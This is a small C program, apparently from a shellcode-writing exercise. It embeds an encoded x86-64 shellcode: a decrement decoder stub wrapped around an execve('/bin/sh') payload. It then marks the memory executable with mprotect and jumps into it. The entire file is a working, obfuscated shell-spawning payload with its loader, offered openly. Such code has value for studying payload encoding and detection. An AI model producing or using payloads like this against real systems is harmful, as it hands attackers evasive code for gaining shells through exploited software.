#include <stdio.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>

typedef void pf_t(void);

char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x1f\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x32\xca\x32\xd3\xb1\x0c\xce\x81\x32\xc1\xb1\x02\x32\xdc\xce\x81";

// decoder_shellcode + bin_sh_shellcode_encoded

int main(){

    printf("Shellcode length : %d bytes", strlen(shellcode));
    // Prints shellcode length in bytes
    mprotect((pf_t*)((uint64_t)shellcode & ~4095), 4096, 0x6);
    // PROT_EXEC | PROC_WRITE on page that contains the shellcode
    ((pf_t*) shellcode)();
    // Execute the shellcode
    return 0;

}
